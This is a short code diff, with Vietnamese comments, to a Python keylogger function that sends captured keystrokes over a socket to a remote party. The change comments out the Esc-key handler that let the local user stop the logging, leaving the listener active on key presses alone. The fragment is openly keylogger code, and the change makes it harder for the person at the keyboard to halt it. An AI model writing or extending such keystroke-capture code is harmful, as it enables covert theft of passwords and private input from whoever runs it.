@@ -37,14 +37,14 @@ def start_keylogger(client_socket):
             print(f'Error when sending data to client: {e}')
             return False  # Dừng keylogger nếu có lỗi khi gửi dữ liệu
 
-    def on_release(key):
-        # Dừng keylogger khi nhấn phím Esc
-        if key == keyboard.Key.esc:
-            print("\nKeylogger stopped by user.")
-            return False  # Dừng listener
+    # def on_release(key):
+    #     # Dừng keylogger khi nhấn phím Esc từ server
+    #     if key == keyboard.Key.esc:
+    #         print("\nKeylogger stopped by user.")
+    #         return False  # Dừng listener
 
     # Bắt đầu lắng nghe sự kiện phím nhấn và thả
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    with keyboard.Listener(on_press=on_press) as listener:
         try:
             listener.join()  # Chờ cho listener hoàn thành
         except Exception as e:
